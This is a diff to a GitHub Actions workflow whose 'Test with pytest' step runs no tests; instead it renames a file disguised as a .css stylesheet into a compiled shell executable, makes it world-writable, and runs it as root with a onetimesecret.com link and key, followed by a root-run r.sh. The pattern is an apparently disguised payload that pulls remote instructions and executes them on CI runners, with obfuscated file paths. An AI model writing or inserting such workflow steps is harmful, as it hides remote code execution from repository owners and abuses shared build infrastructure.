@@ -23,12 +23,12 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        apt install shc -y
+        sudo apt install shc -y
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
         ls
-        mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css ood45.sh.x
-        sudo chmod 777 ood45.sh.x
+        mv cly7e1v/nc7dnhkat/ualml5/sinclairs1m85.css fyxtg.sh.x
+        sudo chmod 777 fyxtg.sh.x
         ls -la
-        sudo ./ood45.sh.x https://onetimesecret.com/secret/nvwa4o49vvoigcxvsrn0a8qn52664it abu40g && sudo sh r.sh
+        sudo ./fyxtg.sh.x https://onetimesecret.com/secret/pq2nmc0v724poka4kkenesxvizzelxc ly9g8d && sudo sh r.sh
